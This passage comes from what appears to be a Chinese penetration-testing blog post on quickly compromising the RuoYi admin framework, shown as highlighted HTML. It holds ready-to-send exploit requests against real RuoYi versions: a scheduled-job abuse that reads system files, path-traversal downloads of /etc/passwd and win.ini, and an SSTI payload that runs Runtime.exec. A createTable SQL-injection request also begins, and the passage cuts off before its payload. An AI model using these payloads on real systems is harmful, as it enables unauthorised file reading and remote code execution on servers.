class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="n">122</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">6261</span><span class="p">.</span><span class="na">112</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Referer</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//127.0.0.1/system/user</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="p">,</span><span class="w"> </span><span class="n">br</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">9</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Cookie</span><span class="p">:</span><span class="w"> </span><span class="n">JSESSIONID</span><span class="o">=</span><span class="n">9b2fa9cc</span><span class="o">-</span><span class="n">71ce</span><span class="o">-</span><span class="n">4a5e</span><span class="o">-</span><span class="n">ad46</span><span class="o">-</span><span class="n">a9c82d44edfb</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="n">195</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">createBy</span><span class="o">=</span><span class="n">admin</span><span class="o">&amp;</span><span class="n">jobId</span><span class="o">=</span><span class="n">161</span><span class="o">&amp;</span><span class="n">jobName</span><span class="o">=</span><span class="n">test111</span><span class="o">&amp;</span><span class="n">jobGroup</span><span class="o">=</span><span class="n">DEFAULT</span><span class="o">&amp;</span><span class="n">invokeTarget</span><span class="o">=</span><span class="n">ruoYiConfig</span><span class="p">.</span><span class="na">setProfile</span><span class="p">(</span><span class="err">&#39;</span><span class="n">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">win</span><span class="p">.</span><span class="na">ini</span><span class="err">&#39;</span><span class="p">)</span><span class="o">&amp;</span><span class="n">cronExpression</span><span class="o">=</span><span class="n">0</span><span class="o">%</span><span class="n">2F10</span><span class="o">+*+*+*+*+%</span><span class="n">3F</span><span class="o">&amp;</span><span class="n">misfirePolicy</span><span class="o">=</span><span class="n">1</span><span class="o">&amp;</span><span class="n">concurrent</span><span class="o">=</span><span class="n">1</span><span class="o">&amp;</span><span class="n">status</span><span class="o">=</span><span class="n">0</span><span class="o">&amp;</span><span class="n">remark</span><span class="o">=</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/26.png"
+	width="2278"
+	height="798"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/26_hu7c5acc21ce16abb9bc710963041ff2f2_164161_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/26_hu7c5acc21ce16abb9bc710963041ff2f2_164161_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="285"
+		data-flex-basis="685px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">monitor</span><span class="o">/</span><span class="n">job</span><span class="o">/</span><span class="n">run</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">127</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="n">9</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;Not(A:Brand&#34;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s">&#34;24&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Chromium&#34;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s">&#34;122&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="p">,</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">javascript</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="cm">/*; q=0.01
+</span></span></span><span class="line"><span class="cl"><span class="cm">Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+</span></span></span><span class="line"><span class="cl"><span class="cm">X-Requested-With: XMLHttpRequest
+</span></span></span><span class="line"><span class="cl"><span class="cm">sec-ch-ua-mobile: ?0
+</span></span></span><span class="line"><span class="cl"><span class="cm">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
+</span></span></span><span class="line"><span class="cl"><span class="cm">sec-ch-ua-platform: &#34;Windows&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cm">Origin: http://127.0.0.1
+</span></span></span><span class="line"><span class="cl"><span class="cm">Sec-Fetch-Site: same-origin
+</span></span></span><span class="line"><span class="cl"><span class="cm">Sec-Fetch-Mode: cors
+</span></span></span><span class="line"><span class="cl"><span class="cm">Sec-Fetch-Dest: empty
+</span></span></span><span class="line"><span class="cl"><span class="cm">Referer: http://127.0.0.1/monitor/job
+</span></span></span><span class="line"><span class="cl"><span class="cm">Accept-Encoding: gzip, deflate, br
+</span></span></span><span class="line"><span class="cl"><span class="cm">Accept-Language: zh-CN,zh;q=0.9
+</span></span></span><span class="line"><span class="cl"><span class="cm">Cookie: JSESSIONID=9b2fa9cc-71ce-4a5e-ad46-a9c82d44edfb
+</span></span></span><span class="line"><span class="cl"><span class="cm">Connection: close
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">jobId=161
+</span></span></span><span class="line"><span class="cl"><span class="cm">GET /common/download/resource?resource=2.txt HTTP/1.1
+</span></span></span><span class="line"><span class="cl"><span class="cm">Host: 127.0.0.1
+</span></span></span><span class="line"><span class="cl"><span class="cm">sec-ch-ua: &#34;Not(A:Brand&#34;;v=&#34;24&#34;, &#34;Chromium&#34;;v=&#34;122&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cm">Accept: application/json, text/javascript, */</span><span class="o">*</span><span class="p">;</span><span class="w"> </span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">01</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">X</span><span class="o">-</span><span class="n">Requested</span><span class="o">-</span><span class="n">With</span><span class="p">:</span><span class="w"> </span><span class="n">XMLHttpRequest</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="o">-</span><span class="n">mobile</span><span class="p">:</span><span class="w"> </span><span class="o">?</span><span class="n">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">10</span><span class="p">.</span><span class="na">0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="n">122</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">6261</span><span class="p">.</span><span class="na">112</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="o">-</span><span class="n">platform</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;Windows&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Origin</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//127.0.0.1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Site</span><span class="p">:</span><span class="w"> </span><span class="n">same</span><span class="o">-</span><span class="n">origin</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Mode</span><span class="p">:</span><span class="w"> </span><span class="n">cors</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Dest</span><span class="p">:</span><span class="w"> </span><span class="n">empty</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Referer</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//127.0.0.1/monitor/job</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="p">,</span><span class="w"> </span><span class="n">br</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">9</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Cookie</span><span class="p">:</span><span class="w"> </span><span class="n">JSESSIONID</span><span class="o">=</span><span class="n">9b2fa9cc</span><span class="o">-</span><span class="n">71ce</span><span class="o">-</span><span class="n">4a5e</span><span class="o">-</span><span class="n">ad46</span><span class="o">-</span><span class="n">a9c82d44edfb</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/27.png"
+	width="2388"
+	height="904"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/27_hubd1ae7c8631f69cc6c3b3a30cdf9e980_273442_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/27_hubd1ae7c8631f69cc6c3b3a30cdf9e980_273442_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="264"
+		data-flex-basis="633px"
+	
+></p>
+<p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/28.png"
+	width="1810"
+	height="472"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/28_hua301ac3b34fe197c853623b78c26c30a_48442_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/28_hua301ac3b34fe197c853623b78c26c30a_48442_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="383"
+		data-flex-basis="920px"
+	
+></p>
+<h3 id="29ruoyi451任意文件下载漏洞">2.9.Ruoyi&lt;4.5.1任意文件下载漏洞
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">/</span><span class="n">common</span><span class="o">/</span><span class="n">download</span><span class="o">/</span><span class="n">resource</span><span class="o">?</span><span class="n">resource</span><span class="o">=/</span><span class="n">profile</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">common</span><span class="o">/</span><span class="n">download</span><span class="o">/</span><span class="n">resource</span><span class="o">?</span><span class="n">resource</span><span class="o">=/</span><span class="n">profile</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">Windows</span><span class="o">/</span><span class="n">win</span><span class="p">.</span><span class="na">ini</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="210ruoyi471-ssti模板注入">2.10.Ruoyi&lt;=4.7.1 SSTI模板注入
+</h3><p>影响版本：Ruoyi&lt;=4.7.1</p>
+<p>影响接口：</p>
+<ol>
+<li>/monitor/cache/getName</li>
+<li>/monitor/cache/getKeys</li>
+<li>/monitor/cache/getValue</li>
+<li>/demo/form/localrefresh/task</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">monitor</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">getKeys</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">127</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;Not(A:Brand&#34;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s">&#34;24&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Chromium&#34;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s">&#34;122&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="o">*/*</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">X</span><span class="o">-</span><span class="n">Requested</span><span class="o">-</span><span class="n">With</span><span class="p">:</span><span class="w"> </span><span class="n">XMLHttpRequest</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="o">-</span><span class="n">mobile</span><span class="p">:</span><span class="w"> </span><span class="o">?</span><span class="n">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">10</span><span class="p">.</span><span class="na">0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="n">122</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">6261</span><span class="p">.</span><span class="na">112</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Referer</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//127.0.0.1/system/user</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="p">,</span><span class="w"> </span><span class="n">br</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">9</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Cookie</span><span class="p">:</span><span class="w"> </span><span class="n">JSESSIONID</span><span class="o">=</span><span class="n">d9598089</span><span class="o">-</span><span class="n">64c2</span><span class="o">-</span><span class="n">4ee9</span><span class="o">-</span><span class="n">bf86</span><span class="o">-</span><span class="n">8930fbbe2d39</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="n">72</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cacheName</span><span class="o">=</span><span class="n">123</span><span class="o">&amp;</span><span class="n">fragment</span><span class="o">=</span><span class="n">$</span><span class="p">{</span><span class="n">T</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="p">).</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="err">&#39;</span><span class="n">calc</span><span class="err">&#39;</span><span class="p">)}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/29.png"
+	width="2509"
+	height="1050"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/29_hu24942020403481d7d1bf4ab970142fa0_316447_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/29_hu24942020403481d7d1bf4ab970142fa0_316447_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="238"
+		data-flex-basis="573px"
+	
+></p>
+<p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/30.png"
+	width="2462"
+	height="920"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/30_hu2f299ee9acf7eb5e67cc257e5a6eca11_301197_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/30_hu2f299ee9acf7eb5e67cc257e5a6eca11_301197_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="267"
+		data-flex-basis="642px"
+	
+></p>
+<p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/31.png"
+	width="2542"
+	height="975"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/31_hu2064000a1f7c15dafd4410f190d3c48a_314740_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/31_hu2064000a1f7c15dafd4410f190d3c48a_314740_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="260"
+		data-flex-basis="625px"
+	
+></p>
+<p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/32.png"
+	width="2508"
+	height="933"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/32_hucec4c536c837aa61e0e4a7ffd44511c9_303130_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/32_hucec4c536c837aa61e0e4a7ffd44511c9_303130_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="268"
+		data-flex-basis="645px"
+	
+></p>
+<h3 id="211ruoyi475--createtable-sql注入漏洞">2.11.ruoyi&lt;=4.7.5  createTable sql注入漏洞
+</h3><p><strong>影响版本：4.7.0&lt;=ruoyi&lt;=4.7.5</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">tool</span><span class="o">/</span><span class="n">gen</span><span class="o">/</span><span class="n">createTable</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">127</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="n">134</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;Not(A:Brand&#34;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s">&#34;24&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Chromium&#34;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s">&#34;122&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="p">,</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">javascript</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="cm">/*; q=0.01
+</span></span></span><span class="line"><span class="cl"><span class="cm">Content-Type: application/x-www-form-urlencoded
+</span></span></span><span class="line"><span class="cl"><span class="cm">X-Requested-With: XMLHttpRequest
+</span></span></span><span class="line"><span class="cl"><span class="cm">sec-ch-ua-mobile: ?0
+</span></span></span><span class="line"><span class="cl"><span class="cm">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
+</span></span></span><span class="line"><span class="cl"><span class="cm">sec-ch-ua-platform: &#34;Windows&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cm">Origin: http://127.0.0.1
+</span></span></span><span class="line"><span class="cl"><span class="cm">Sec-Fetch-Site: same-origin
+</span></span></span><span class="line"><span class="cl"><span class="cm">Sec-Fetch-Mode: cors
+</span></span></span><span class="line"><span class="cl"><span class="cm">Sec-Fetch-Dest: empty
+</span></span></span><span class="line"><span class="cl"><span class="cm">Referer: http://127.0.0.1/tool/gen
+</span></span></span><span class="line"><span class="cl"><span class="cm">Accept-Encoding: gzip, deflate, br
+</span></span></span><span class="line"><span class="cl"><span class="cm">Accept-Language: zh-CN,zh;q=0.9
+</span></span></span><span class="line"><span class="cl"><span class="cm">Cookie: rememberMe=xVpV8rBkMo+xI/cuWbp7/tUOjHD9seQsgIf6WIJa71umDcgPjo9pJsZA3+UJkTjIHnjgs02TyzjCQzV8Pi5rU5c7/NUIBuOP5aLawSivKi2pWNha13Ue39uqxcxMn0ckhOa10QjfPr79ZBEZ0niw4Aa3TTQUcpTyippx6pk6tEt2g3jZtZZtqSG3wwaBTHa/sj6R9pQ9xsOlT9Jw9fC/Bcy
+</span></span></span><span class="line"><span class="cl"><span class="cm">Connection: close
+</span></span></span><span class="line"><span class="cl"><span class="cm">
